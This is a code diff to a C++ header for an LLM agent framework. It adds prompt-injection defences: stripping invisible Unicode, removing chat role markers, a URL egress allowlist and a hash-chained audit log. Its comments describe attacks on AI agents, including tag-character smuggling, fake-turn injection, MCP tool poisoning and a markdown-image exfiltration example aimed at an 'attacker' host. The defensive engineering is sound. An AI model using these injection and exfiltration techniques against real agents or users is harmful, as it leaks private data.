@@ -55,7 +55,7 @@ inline long estimate_tokens(const std::string& text) {
 #include "ariadne_version_gen.hpp"
 constexpr const char* ARIADNE_VERSION = ARIADNE_VERSION_STRING;
 #else
-constexpr const char* ARIADNE_VERSION = "2.11.0";
+constexpr const char* ARIADNE_VERSION = "2.12.0";
 #endif
 inline std::string version() { return ARIADNE_VERSION; }
 
@@ -344,6 +344,73 @@ inline std::string spotlight_text(const std::string& untrusted,
 }
 
 // ════════════════════════════════════════════════════════════════
+// 不可见字符 / 角色定界符净化 (Unicode-smuggling sanitizer) — 确定性注入防御 (D117)
+//   ASCII 走私 / Unicode Tag 注入：把人眼不可见的指令（Tags 区、变体选择符、
+//   零宽字符、不可见数学算子）塞进文本，模型却会读取——既是注入信道也是隐蔽
+//   外泄信道（已对 M365 Copilot / Grok 等实证）。Spotlighting(D100) 仅「标注」
+//   不可信数据，本模块「剥离」不可见码点。另含聊天角色/模板定界符净化，防御
+//   「假轮注入」(ChatInject)：把 <|im_start|>/[INST] 等塞进数据伪造对话轮次。
+// ════════════════════════════════════════════════════════════════
+
+/** 判断某 Unicode 码点是否为「不可见/可滥用」字符。 */
+inline bool is_invisible_codepoint(unsigned cp) {
+    return (cp >= 0x200B && cp <= 0x200D)    // 零宽空格 / ZWNJ / ZWJ
+        ||  cp == 0x2060                      // word joiner
+        || (cp >= 0x2061 && cp <= 0x2064)    // 不可见数学算子
+        ||  cp == 0xFEFF                      // 零宽不换行空格 / BOM
+        || (cp >= 0xFE00 && cp <= 0xFE0F)    // 变体选择符
+        || (cp >= 0xE0100 && cp <= 0xE01EF)  // 变体选择符补充
+        || (cp >= 0xE0000 && cp <= 0xE007F); // Tags 区（ASCII 走私）
+}
+
+/** 剥离不可信文本中的不可见 Unicode（D117）。应在不可信文本进入 prompt 或作为
+ *  输出离开前过滤。found（可选）置位表示发现并移除过不可见字符。逐 UTF-8 序列
+ *  解码，保留可见码点的原始字节；非法/截断序列原样保留。确定性、零依赖。 */
+inline std::string strip_invisible_unicode(const std::string& utf8, bool* found = nullptr) {
+    std::string out;
+    out.reserve(utf8.size());
+    if (found) *found = false;
+    size_t i = 0, n = utf8.size();
+    while (i < n) {
+        unsigned char b0 = (unsigned char)utf8[i];
+        unsigned cp; int len;
+        if      (b0 < 0x80)         { cp = b0;         len = 1; }
+        else if ((b0 >> 5) == 0x6)  { cp = b0 & 0x1Fu; len = 2; }
+        else if ((b0 >> 4) == 0xE)  { cp = b0 & 0x0Fu; len = 3; }
+        else if ((b0 >> 3) == 0x1E) { cp = b0 & 0x07u; len = 4; }
+        else { out += (char)b0; ++i; continue; }              // 非法首字节
+        if (i + (size_t)len > n) { out += (char)b0; ++i; continue; }  // 截断序列
+        bool valid = true;
+        for (int k = 1; k < len; ++k) {
+            unsigned char bk = (unsigned char)utf8[i + k];
+            if ((bk >> 6) != 0x2) { valid = false; break; }   // 续字节须为 10xxxxxx
+            cp = (cp << 6) | (bk & 0x3Fu);
+        }
+        if (!valid) { out += (char)b0; ++i; continue; }
+        if (is_invisible_codepoint(cp)) { if (found) *found = true; }
+        else out.append(utf8, i, (size_t)len);               // 保留原始字节
+        i += (size_t)len;
+    }
+    return out;
+}
+
+/** 剥离不可信文本中的聊天角色/模板定界符（D117），防御假轮注入。 */
+inline std::string sanitize_role_markers(const std::string& text) {
+    static const char* kMarkers[] = {
+        "<|im_start|>", "<|im_end|>", "<|system|>", "<|user|>", "<|assistant|>",
+        "<|endoftext|>", "<|eot_id|>", "<|start_header_id|>", "<|end_header_id|>",
+        "[INST]", "[/INST]", "<<SYS>>", "<</SYS>>", "<start_of_turn>", "<end_of_turn>"
+    };
+    std::string out = text;
+    for (const char* m : kMarkers) {
+        std::string mk = m;
+        for (size_t p = out.find(mk); p != std::string::npos; p = out.find(mk, p))
+            out.erase(p, mk.size());
+    }
+    return out;
+}
+
+// ════════════════════════════════════════════════════════════════
 // 致命三元组污点追踪 (Lethal-trifecta taint tracking) — 结构化注入防御 (D106)
 //   Spotlighting (D100) 是概率性防御；CaMeL/Simon Willison「致命三元组」给出
 //   确定性的数据流防御：当一个 agent 同时拥有 (1) 访问私有数据、(2) 暴露于
@@ -390,6 +457,108 @@ public:
 private:
     bool seen_untrusted_ = false;
     bool seen_private_   = false;
+};
+
+// ════════════════════════════════════════════════════════════════
+// 出口域名白名单 / URL 抽取 (Egress allowlist) — 确定性外泄防御 (D119)
+//   markdown 图片/链接外泄（![](https://attacker/?q=<stolen>) 一类）是「致命
+//   三元组」中可被确定性切断的一环（EchoLeak/CVE-2025-32711、GitLab Duo、
+//   ForcedLeak 均借此外泄）。与 TaintTracker(D106) 互补：污点决定「是否可发」，
+//   白名单决定「可发往何处」。须排除 IP 字面量与 data:/file: 等非 http(s) scheme。
+// ════════════════════════════════════════════════════════════════
+
+/** 从文本中抽取所有 URL（D119）：内联 ](url)（覆盖 [t](u) 与 ![alt](u)）、
+ *  引用式定义 [ref]: url、尖括号自动链接 <scheme://...>。用于出口审查。 */
+inline std::vector<std::string> extract_markdown_urls(const std::string& text) {
+    std::vector<std::string> urls;
+    auto push = [&](std::string u) {
+        size_t a = u.find_first_not_of(" \t\r\n");
+        if (a == std::string::npos) return;
+        size_t b = u.find_last_not_of(" \t\r\n");
+        u = u.substr(a, b - a + 1);
+        size_t sp = u.find_first_of(" \t");        // 去掉可选标题 url "title"
+        if (sp != std::string::npos) u = u.substr(0, sp);
+        if (!u.empty()) urls.push_back(u);
+    };
+    // 1) 内联 ](url) —— 覆盖链接与图片
+    for (size_t p = text.find("]("); p != std::string::npos; p = text.find("](", p + 1)) {
+        size_t s = p + 2, e = text.find(')', s);
+        if (e == std::string::npos) break;
+        push(text.substr(s, e - s));
+    }
+    // 2) 引用式定义 [ref]: url（逐行）
+    {
+        size_t i = 0, n = text.size();
+        while (i < n) {
+            size_t eol = text.find('\n', i);
+            std::string line = text.substr(i, (eol == std::string::npos ? n : eol) - i);
+            i = (eol == std::string::npos ? n : eol + 1);
+            size_t lb = line.find('[');
+            if (lb == std::string::npos) continue;
+            size_t rb = line.find("]:", lb);
+            if (rb != std::string::npos) push(line.substr(rb + 2));
+        }
+    }
+    // 3) 尖括号自动链接 <scheme://...>
+    for (size_t p = text.find('<'); p != std::string::npos; p = text.find('<', p + 1)) {
+        size_t e = text.find('>', p + 1);
+        if (e == std::string::npos) break;
+        std::string inner = text.substr(p + 1, e - p - 1);
+        if (inner.find("://") != std::string::npos) push(inner);
+    }
+    return urls;
+}
+
+/** 出口域名白名单（D119）：只允许把数据发往显式批准的主机。 */
+class EgressAllowlist {
+public:
+    void allow(const std::string& host) {
+        std::string h = lower(host);
+        if (!h.empty()) hosts_.insert(h);
+    }
+    /** url 主机是否在白名单内：scheme 必须 http/https；拒绝 data:/file:/IP 字面量。 */
+    bool is_allowed(const std::string& url) const {
+        std::string scheme, host;
+        if (!parse(url, scheme, host)) return false;
+        if (scheme != "http" && scheme != "https") return false;
+        if (is_ip_literal(host)) return false;
+        for (const auto& a : hosts_) {
+            if (host == a) return true;
+            if (host.size() > a.size() + 1 &&
+                host.compare(host.size() - a.size() - 1, a.size() + 1, "." + a) == 0)
+                return true;                        // 显式子域 host==*.a
+        }
+        return false;
+    }
+    size_t size() const { return hosts_.size(); }
+private:
+    std::set<std::string> hosts_;
+    static std::string lower(const std::string& s) {
+        std::string r = s;
+        for (auto& c : r) c = (char)std::tolower((unsigned char)c);
+        return r;
+    }
+    static bool is_ip_literal(const std::string& host) {
+        if (host.find(':') != std::string::npos) return true;   // IPv6 字面量
+        if (host.empty()) return false;
+        for (char c : host)
+            if (!((c >= '0' && c <= '9') || c == '.')) return false;
+        return true;                                            // a.b.c.d 形式
+    }
+    static bool parse(const std::string& url, std::string& scheme, std::string& host) {
+        size_t s = url.find("://");
+        if (s == std::string::npos) return false;               // data:/file:/javascript: 无 ://
+        scheme = lower(url.substr(0, s));
+        size_t hs = s + 3;
+        size_t he = url.find_first_of("/?#", hs);
+        host = url.substr(hs, (he == std::string::npos ? url.size() : he) - hs);
+        size_t at = host.find('@');                             // 去用户名
+        if (at != std::string::npos) host = host.substr(at + 1);
+        size_t colon = host.find(':');                          // 去端口
+        if (colon != std::string::npos) host = host.substr(0, colon);
+        host = lower(host);
+        return !host.empty();
+    }
 };
 
 // ════════════════════════════════════════════════════════════════
@@ -454,6 +623,113 @@ public:
 private:
     ToolRiskLevel default_;
     std::map<std::string, ToolRiskLevel> levels_;
+};
+
+// ════════════════════════════════════════════════════════════════
+// SHA-256 + 防篡改审计日志 (Tamper-evident audit log) — OWASP Agentic T8 (D120)
+//   「否认与不可追溯」(Repudiation & Untraceability) 是 OWASP Agentic 头部威胁；
+//   对策是不可否认、可验证完整性的工具调用审计。哈希链：每条记录嵌入前一条的
+//   SHA-256，任意改动/删除/重排都会在 verify() 中暴露。用真正的密码学 SHA-256
+//   （而非 FNV）——后者不足以抵抗会重算整条链的伪造者。自包含、零依赖。
+// ════════════════════════════════════════════════════════════════
+
+/** SHA-256 摘要（D120），返回 64 位十六进制小写串。自包含实现，零依赖。 */
+inline std::string sha256_hex(const std::string& msg) {
+    auto rotr = [](uint32_t x, uint32_t n) -> uint32_t { return (x >> n) | (x << (32 - n)); };
+    static const uint32_t K[64] = {
+        0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
+        0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
+        0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
+        0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
+        0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
+        0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
+        0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
+        0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2 };
+    uint32_t h[8] = {0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,
+                     0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19};
+    std::vector<unsigned char> data(msg.begin(), msg.end());
+    uint64_t bitlen = (uint64_t)data.size() * 8;
+    data.push_back(0x80);
+    while (data.size() % 64 != 56) data.push_back(0x00);
+    for (int i = 7; i >= 0; --i) data.push_back((unsigned char)((bitlen >> (i * 8)) & 0xFF));
+    for (size_t off = 0; off < data.size(); off += 64) {
+        uint32_t w[64];
+        for (int i = 0; i < 16; ++i)
+            w[i] = ((uint32_t)data[off+i*4]   << 24) | ((uint32_t)data[off+i*4+1] << 16)
+                 | ((uint32_t)data[off+i*4+2] << 8)  |  (uint32_t)data[off+i*4+3];
+        for (int i = 16; i < 64; ++i) {
+            uint32_t s0 = rotr(w[i-15],7) ^ rotr(w[i-15],18) ^ (w[i-15] >> 3);
+            uint32_t s1 = rotr(w[i-2],17) ^ rotr(w[i-2],19) ^ (w[i-2] >> 10);
+            w[i] = w[i-16] + s0 + w[i-7] + s1;
+        }
+        uint32_t a=h[0],b=h[1],c=h[2],d=h[3],e=h[4],f=h[5],g=h[6],hh=h[7];
+        for (int i = 0; i < 64; ++i) {
+            uint32_t S1 = rotr(e,6) ^ rotr(e,11) ^ rotr(e,25);
+            uint32_t ch = (e & f) ^ (~e & g);
+            uint32_t t1 = hh + S1 + ch + K[i] + w[i];
+            uint32_t S0 = rotr(a,2) ^ rotr(a,13) ^ rotr(a,22);
+            uint32_t maj = (a & b) ^ (a & c) ^ (b & c);
+            uint32_t t2 = S0 + maj;
+            hh=g; g=f; f=e; e=d+t1; d=c; c=b; b=a; a=t1+t2;
+        }
+        h[0]+=a;h[1]+=b;h[2]+=c;h[3]+=d;h[4]+=e;h[5]+=f;h[6]+=g;h[7]+=hh;
+    }
+    static const char* hx = "0123456789abcdef";
+    std::string out; out.reserve(64);
+    for (int i = 0; i < 8; ++i)
+        for (int j = 7; j >= 0; --j) out += hx[(h[i] >> (j * 4)) & 0xF];
+    return out;
+}
+
+/** 审计日志中的一条记录（哈希链节点）。 */
+struct AuditEntry {
+    long        seq = 0;
+    std::string event;       // 事件 JSON（规范化 dump）
+    std::string prev_hash;   // 前一条的 hash（首条为 64 个 '0'）
+    std::string hash;        // SHA-256(seq ⨂ prev_hash ⨂ event)
+};
+
+/** 防篡改审计日志（D120）：哈希链保证完整性。verify() 返回 -1 表示完整，
+ *  否则返回首个被篡改记录的下标（改动 event/hash、删除或重排均可检出）。 */
+class AuditLog {
+public:
+    void append(const json& event) {
+        AuditEntry e;
+        e.seq       = (long)entries_.size();
+        e.event     = event.is_null() ? std::string("{}") : event.dump();
+        e.prev_hash = entries_.empty() ? std::string(64, '0') : entries_.back().hash;
+        e.hash      = chain_hash(e.seq, e.prev_hash, e.event);
+        entries_.push_back(std::move(e));
+    }
+    /** 直接追加一条原始记录（不重算哈希）——用于从持久化日志重建后再 verify()。 */
+    void append_raw(const AuditEntry& e) { entries_.push_back(e); }
+    long verify() const {
+        std::string prev(64, '0');
+        for (size_t i = 0; i < entries_.size(); ++i) {
+            const auto& e = entries_[i];
+            if (e.prev_hash != prev) return (long)i;
+            if (e.hash != chain_hash(e.seq, prev, e.event)) return (long)i;
+            prev = e.hash;
+        }
+        return -1;
+    }
+    size_t size() const { return entries_.size(); }
+    const std::vector<AuditEntry>& entries() const { return entries_; }
+    std::string head_hash() const { return entries_.empty() ? std::string(64,'0') : entries_.back().hash; }
+    std::string to_jsonl() const {
+        std::string out;
+        for (const auto& e : entries_) {
+            json j = {{"seq", e.seq}, {"event", json::parse(e.event)},
+                      {"prev_hash", e.prev_hash}, {"hash", e.hash}};
+            out += j.dump(); out += "\n";
+        }
+        return out;
+    }
+private:
+    static std::string chain_hash(long seq, const std::string& prev, const std::string& event) {
+        return sha256_hex(std::to_string(seq) + "\x1f" + prev + "\x1f" + event);
+    }
+    std::vector<AuditEntry> entries_;
 };
 
 // ════════════════════════════════════════════════════════════════
@@ -754,12 +1030,14 @@ inline bool is_gpt5_family(const std::string& model) {
     return model.find("gpt-5") != std::string::npos;
 }
 
-/** reasoning effort → Gemini 3 thinking_level（空串=不设置；none/minimal→minimal；
- *  xhigh 归一为 high）(D83/D113)。Gemini 3.x 思考常开，最小档为 minimal。 */
+/** reasoning effort → Gemini 3.x thinking_level（空串=不设置）(D83/D113/D115)。
+ *  ⚠️ Gemini 3.x 仅接受 low|medium|high —— "minimal" 不是合法值，发送会 400
+ *  （此前 D83/D113 误将 none/minimal 映射为 "minimal"，是隐性 bug）。
+ *  归一：none/minimal/low→low，medium→medium，high/xhigh→high。 */
 inline std::string gemini_thinking_level(const std::string& effort) {
-    if (effort == "none" || effort == "minimal") return "minimal";
-    if (effort == "xhigh") return "high";
-    if (effort == "low" || effort == "medium" || effort == "high") return effort;
+    if (effort == "none" || effort == "minimal" || effort == "low") return "low";
+    if (effort == "medium") return "medium";
+    if (effort == "high"  || effort == "xhigh")  return "high";
     return "";  // 空串或未知值：不设置
 }
 
@@ -899,6 +1177,70 @@ public:
 private:
     mutable std::shared_mutex mu_;
     std::vector<VectorEntry> entries_;
+};
+
+// ════════════════════════════════════════════════════════════════
+// 记忆写入策略 (Memory write-path) — 去重合并 (D124)
+//   有了向量存储还需「写入路径」决策：对候选事实，在 top-s 相似既有记忆中
+//   决定 ADD（新颖）/ UPDATE（增强既有）/ REMOVE（被否定）/ NOOP（重复）。
+//   Mem0 式 4 操作 upsert。默认纯阈值（cosine）：≥dup→NOOP，[consider,dup)→
+//   UPDATE，<consider→ADD；模糊区间可注入 LLM relation lambda 做更细判断。
+//   纯逻辑、可离线单测（注入定值 embedding 与 relation 桩）。
+// ════════════════════════════════════════════════════════════════
+
+// 注意：枚举值用 REMOVE 而非 DELETE —— DELETE 是 Windows 宏（winnt.h，经 curl.h 引入）。
+enum class MemoryOp { ADD, UPDATE, REMOVE, NOOP };
+
+struct MemoryFact {
+    std::string        id;
+    std::string        text;
+    std::vector<float> embedding;
+    json               meta;
+};
+
+struct UpsertDecision {
+    MemoryOp    op = MemoryOp::ADD;
+    std::string target_id;     // UPDATE/REMOVE 时指向被合并/删除的既有记忆
+    std::string merged_text;   // UPDATE 时的合并文本（默认=新文本）
+};
+
+class FactUpsertPolicy {
+public:
+    using RelationFn = std::function<UpsertDecision(const MemoryFact&,
+                                                    const std::vector<MemoryFact>&)>;
+
+    explicit FactUpsertPolicy(double dup_threshold = 0.95,
+                              double consider_threshold = 0.80,
+                              RelationFn fn = nullptr)
+        : dup_(dup_threshold), consider_(consider_threshold), relation_(std::move(fn)) {}
+
+    /** candidate 与 top_s（既有相似记忆）比较，给出写入决定。 */
+    UpsertDecision decide(const MemoryFact& candidate,
+                          const std::vector<MemoryFact>& top_s) const {
+        double best = -1.0; const MemoryFact* bestf = nullptr;
+        for (const auto& f : top_s) {
+            double c = cosine(candidate.embedding, f.embedding);
+            if (c > best) { best = c; bestf = &f; }
+        }
+        if (!bestf || best < consider_)                       // 无足够相似者 → 新增
+            return {MemoryOp::ADD, "", candidate.text};
+        if (best >= dup_)                                     // 几乎重复 → 不写
+            return {MemoryOp::NOOP, bestf->id, bestf->text};
+        if (relation_) return relation_(candidate, top_s);    // 模糊区间交给注入逻辑
+        return {MemoryOp::UPDATE, bestf->id, candidate.text}; // 默认增强既有
+    }
+private:
+    double     dup_, consider_;
+    RelationFn relation_;
+    static double cosine(const std::vector<float>& a, const std::vector<float>& b) {
+        if (a.empty() || a.size() != b.size()) return 0.0;
+        double dot = 0, na = 0, nb = 0;
+        for (size_t i = 0; i < a.size(); ++i) {
+            dot += (double)a[i] * b[i]; na += (double)a[i] * a[i]; nb += (double)b[i] * b[i];
+        }
+        if (na == 0 || nb == 0) return 0.0;
+        return dot / (std::sqrt(na) * std::sqrt(nb));
+    }
 };
 
 // ════════════════════════════════════════════════════════════════
@@ -1348,6 +1690,125 @@ public:
 private:
     SummarizerFn     summarize_;
     CompactionConfig cfg_;
+};
+
+// ════════════════════════════════════════════════════════════════
+// 结构化便签 / 上下文卸载 (Note store) — 上下文工程 (D123)
+//   把信息记在上下文窗口之外的结构化便签里，按 token 预算再渲染回来——区别于
+//   D91 上下文压缩（压缩在线对话）。镜像 Anthropic memory 工具的 put/append/
+//   str_replace/erase/render；增量改写避免「上下文坍缩」(ACE)。可序列化以跨
+//   上下文重置持久化。纯逻辑、可离线单测。
+// ════════════════════════════════════════════════════════════════
+
+class NoteStore {
+public:
+    /** 写入/覆盖 section 下 key 的值。 */
+    void put(const std::string& section, const std::string& key, const std::string& value) {
+        sections_[section][key] = value;
+        order(section, key);
+    }
+    /** 追加一行到 section（自动生成递增 key，以 '_' 前缀标记为无键行）。 */
+    void append(const std::string& section, const std::string& line) {
+        std::string key = "_" + std::to_string(counters_[section]++);
+        sections_[section][key] = line;
+        order(section, key);
+    }
+    /** 在 section/key 的值里把 old_s 替换为 new_s（增量更新；命中返回 true）。 */
+    bool str_replace(const std::string& section, const std::string& key,
+                     const std::string& old_s, const std::string& new_s) {
+        auto si = sections_.find(section);
+        if (si == sections_.end()) return false;
+        auto ki = si->second.find(key);
+        if (ki == si->second.end()) return false;
+        size_t p = ki->second.find(old_s);
+        if (p == std::string::npos) return false;
+        ki->second.replace(p, old_s.size(), new_s);
+        return true;
+    }
+    /** 删除 section/key。 */
+    void erase(const std::string& section, const std::string& key) {
+        auto si = sections_.find(section);
+        if (si == sections_.end()) return;
+        si->second.erase(key);
+        auto& ord = key_order_[section];
+        ord.erase(std::remove(ord.begin(), ord.end(), key), ord.end());
+    }
+    /** 渲染为文本，受 token 预算约束（加入某块会超预算即停止）。
+     *  only_sections 为空则渲染全部；按写入顺序输出。budget_tokens=0 不限。 */
+    std::string render(const std::vector<std::string>& only_sections = {},
+                       size_t budget_tokens = 0) const {
+        std::string out;
+        auto want = [&](const std::string& s) {
+            return only_sections.empty()
+                || std::find(only_sections.begin(), only_sections.end(), s) != only_sections.end();
+        };
+        for (const auto& sec : section_order_) {
+            if (!want(sec)) continue;
+            auto si = sections_.find(sec);
+            if (si == sections_.end() || si->second.empty()) continue;
+            std::string block = "## " + sec + "\n";
+            auto oi = key_order_.find(sec);
+            if (oi != key_order_.end())
+                for (const auto& k : oi->second) {
+                    auto vi = si->second.find(k);
+                    if (vi == si->second.end()) continue;
+                    if (!k.empty() && k[0] == '_') block += vi->second + "\n";  // append 行
+                    else block += k + ": " + vi->second + "\n";                 // put 键值
+                }
+            if (budget_tokens > 0 &&
+                (size_t)estimate_tokens(out + block) > budget_tokens) break;
+            out += block;
+        }
+        return out;
+    }
+    size_t section_count() const { return sections_.size(); }
+
+    json to_json() const {
+        json j; j["sections"] = json::object();
+        for (const auto& sec : section_order_) {
+            json items = json::array();
+            auto oi = key_order_.find(sec);
+            auto si = sections_.find(sec);
+            if (oi != key_order_.end() && si != sections_.end())
+                for (const auto& k : oi->second)
+                    if (si->second.count(k))
+                        items.push_back({{"key", k}, {"value", si->second.at(k)}});
+            j["sections"][sec] = items;
+        }
+        j["section_order"] = section_order_;
+        return j;
+    }
+    void load_json(const json& j) {
+        sections_.clear(); key_order_.clear(); section_order_.clear(); counters_.clear();
+        if (!j.is_object()) return;
+        if (j.contains("section_order") && j["section_order"].is_array())
+            for (const auto& s : j["section_order"])
+                if (s.is_string()) section_order_.push_back(s.get<std::string>());
+        if (j.contains("sections") && j["sections"].is_object())
+            for (auto it = j["sections"].begin(); it != j["sections"].end(); ++it) {
+                const std::string sec = it.key();
+                if (std::find(section_order_.begin(), section_order_.end(), sec) == section_order_.end())
+                    section_order_.push_back(sec);
+                if (it.value().is_array())
+                    for (const auto& item : it.value()) {
+                        std::string k = item.value("key", ""), v = item.value("value", "");
+                        if (k.empty()) continue;
+                        sections_[sec][k] = v;
+                        key_order_[sec].push_back(k);
+                    }
+            }
+    }
+private:
+    void order(const std::string& section, const std::string& key) {
+        if (std::find(section_order_.begin(), section_order_.end(), section) == section_order_.end())
+            section_order_.push_back(section);
+        auto& ord = key_order_[section];
+        if (std::find(ord.begin(), ord.end(), key) == ord.end()) ord.push_back(key);
+    }
+    std::map<std::string, std::map<std::string, std::string>> sections_;
+    std::map<std::string, std::vector<std::string>>           key_order_;
+    std::vector<std::string>                                  section_order_;
+    std::map<std::string, long>                               counters_;
 };
 
 /** 所有 Provider 的公共接口 */
@@ -1817,6 +2278,103 @@ struct WorkflowState {
 
 private:
     json resolve_value(const json& v) const;
+};
+
+
+// ════════════════════════════════════════════════════════════════
+// 计划静态检查 (Plan linting) — 执行前结构校验 (D121)
+//   MAST（Berkeley 多 agent 失败分类）：41.77% 的失败属「规范/系统设计」类，
+//   且在执行前就可捕获；21.30% 是「任务校验」缺口。本检查器在执行器花费任何
+//   token 之前对 WorkflowPlan 做确定性结构 lint：悬空依赖、重复/空 id、自依赖、
+//   空动作、json 步骤缺 output_schema、扇出过宽、依赖环。内置规则 + add_rule
+//   可扩展（如接入工具注册表做「未注册工具」检查）。纯逻辑、可离线单测。
+// ════════════════════════════════════════════════════════════════
+
+enum class PlanLintSeverity { Warning, Error };
+
+struct PlanLintFinding {
+    std::string      rule;       // 规则名（如 "undefined_dep"）
+    std::string      step_id;    // 关联步骤（空=全局问题）
+    std::string      message;
+    PlanLintSeverity severity = PlanLintSeverity::Error;
+};
+
+class PlanLinter {
+public:
+    using RuleFn = std::function<std::vector<PlanLintFinding>(const WorkflowPlan&)>;
+
+    explicit PlanLinter(int max_fanout = 16) : max_fanout_(max_fanout) {}
+
+    void add_rule(RuleFn fn) { custom_.push_back(std::move(fn)); }
+
+    std::vector<PlanLintFinding> lint(const WorkflowPlan& plan) const {
+        std::vector<PlanLintFinding> out;
+        builtin(plan, out);
+        for (const auto& r : custom_) {
+            auto f = r(plan);
+            out.insert(out.end(), f.begin(), f.end());
+        }
+        return out;
+    }
+    /** 无 Error 级问题即通过（Warning 不阻断执行）。 */
+    bool ok(const WorkflowPlan& plan) const {
+        for (const auto& f : lint(plan))
+            if (f.severity == PlanLintSeverity::Error) return false;
+        return true;
+    }
+private:
+    int                 max_fanout_;
+    std::vector<RuleFn> custom_;
+
+    void builtin(const WorkflowPlan& plan, std::vector<PlanLintFinding>& out) const {
+        auto err  = [&](const std::string& rule, const std::string& id, const std::string& msg) {
+            out.push_back({rule, id, msg, PlanLintSeverity::Error}); };
+        auto warn = [&](const std::string& rule, const std::string& id, const std::string& msg) {
+            out.push_back({rule, id, msg, PlanLintSeverity::Warning}); };
+
+        if (plan.steps.empty()) { warn("empty_plan", "", "plan has no steps"); return; }
+
+        std::set<std::string> ids;
+        for (const auto& s : plan.steps) {
+            if (s.id.empty()) err("empty_id", "", "a step has an empty id");
+            else if (!ids.insert(s.id).second) err("dup_id", s.id, "duplicate step id");
+        }
+        // 依赖检查 + 扇出统计
+        std::map<std::string, int> fanout;
+        for (const auto& s : plan.steps)
+            for (const auto& dep : s.depends_on) {
+                if (dep == s.id) err("self_dep", s.id, "step depends on itself");
+                else if (!ids.count(dep)) err("undefined_dep", s.id, "depends on unknown step '" + dep + "'");
+                else fanout[dep]++;
+            }
+        for (const auto& kv : fanout)
+            if (kv.second > max_fanout_)
+                warn("fanout_width", kv.first, "fan-out width " + std::to_string(kv.second)
+                     + " exceeds cap " + std::to_string(max_fanout_));
+        // 每步内容检查
+        for (const auto& s : plan.steps) {
+            if ((s.type == StepType::TOOL || s.type == StepType::LLM) && s.action.empty())
+                err("empty_action", s.id, "step has empty action");
+            if (s.type == StepType::LLM && s.json_mode && s.output_schema.is_null())
+                warn("json_no_schema", s.id, "json_mode LLM step without output_schema");
+        }
+        // 依赖环检测（Kahn 拓扑；仅对已定义边）
+        std::map<std::string, int>                      indeg;
+        std::map<std::string, std::vector<std::string>> adj;
+        for (const auto& s : plan.steps) indeg[s.id] = 0;
+        for (const auto& s : plan.steps)
+            for (const auto& dep : s.depends_on)
+                if (ids.count(dep) && dep != s.id) { adj[dep].push_back(s.id); indeg[s.id]++; }
+        std::vector<std::string> q;
+        for (const auto& kv : indeg) if (kv.second == 0) q.push_back(kv.first);
+        size_t seen = 0;
+        while (!q.empty()) {
+            std::string u = q.back(); q.pop_back();
+            ++seen;
+            for (const auto& v : adj[u]) if (--indeg[v] == 0) q.push_back(v);
+        }
+        if (seen < indeg.size()) err("cycle", "", "plan contains a dependency cycle");
+    }
 };
 
 
@@ -2307,6 +2865,54 @@ inline TrajectoryScore score_trajectory(const std::vector<std::string>& actual,
     return r;
 }
 
+// ════════════════════════════════════════════════════════════════
+// 多准则评分 (Rubric scoring) — LLM-judge 去偏 (D122)
+//   2026 评测发现：前沿 judge 的位置偏差已很小，但风格/冗长偏差仍显著；把判断
+//   「分解」为带权独立准则是文献给出的缓解（Autorubric/RULERS）。
+//   rubric_score = clamp01(Σ vᵢ·wᵢ / Σ_{wᵢ>0} wᵢ)；weight<0 为惩罚项。
+//   verdict 作为数据注入（judge lambda 或测试桩）→ 纯算术、可离线单测。
+// ════════════════════════════════════════════════════════════════
+
+struct Criterion  { std::string id; double weight = 1.0; };   // weight<0 = 惩罚项
+struct CritVerdict { std::string id; double value = 0.0; };   // value ∈ [0,1]
+enum class EnsembleMode { Majority, Weighted, Unanimous, Any };
+
+/** 单次评分：clamp01(Σ vᵢ·wᵢ / Σ_{wᵢ>0} wᵢ)。缺失 verdict 的准则按 0 计。 */
+inline double rubric_score(const std::vector<Criterion>& criteria,
+                           const std::vector<CritVerdict>& verdicts) {
+    std::map<std::string,double> v;
+    for (const auto& cv : verdicts) v[cv.id] = std::clamp(cv.value, 0.0, 1.0);
+    double num = 0.0, den = 0.0;
+    for (const auto& c : criteria) {
+        double val = v.count(c.id) ? v[c.id] : 0.0;
+        num += val * c.weight;
+        if (c.weight > 0) den += c.weight;
+    }
+    if (den <= 0) return 0.0;
+    return std::clamp(num / den, 0.0, 1.0);
+}
+
+/** 多评委集成。Weighted=分数均值；Majority/Unanimous/Any 以 0.5 为通过阈值聚合。 */
+inline double rubric_score_ensemble(const std::vector<Criterion>& criteria,
+                                    const std::vector<std::vector<CritVerdict>>& panel,
+                                    EnsembleMode mode = EnsembleMode::Weighted) {
+    if (panel.empty()) return 0.0;
+    std::vector<double> scores;
+    scores.reserve(panel.size());
+    for (const auto& vs : panel) scores.push_back(rubric_score(criteria, vs));
+    if (mode == EnsembleMode::Weighted) {
+        double sum = 0.0; for (double s : scores) sum += s;
+        return sum / (double)scores.size();
+    }
+    int pass = 0; for (double s : scores) if (s >= 0.5) ++pass;
+    switch (mode) {
+        case EnsembleMode::Unanimous: return (pass == (int)scores.size()) ? 1.0 : 0.0;
+        case EnsembleMode::Any:       return (pass > 0) ? 1.0 : 0.0;
+        case EnsembleMode::Majority:
+        default:                      return (pass * 2 > (int)scores.size()) ? 1.0 : 0.0;
+    }
+}
+
 using ToolFn = std::function<json(const json& params)>;
 
 /** D104 — MCP 工具注解（2025-11-25 spec，信任/安全元数据）。
@@ -2341,6 +2947,74 @@ struct ToolDef {
     std::string     name, description;
     json            input_schema, output_schema;
     ToolAnnotations annotations;   // D104 — 来自 MCP tools/list（可选）
+};
+
+// ════════════════════════════════════════════════════════════════
+// 工具清单钉固 (Tool-manifest pinning) — MCP 供应链防御 (D118)
+//   MCP「rug pull」/「工具投毒」：服务器在工具描述/schema 里塞指令，或在人工
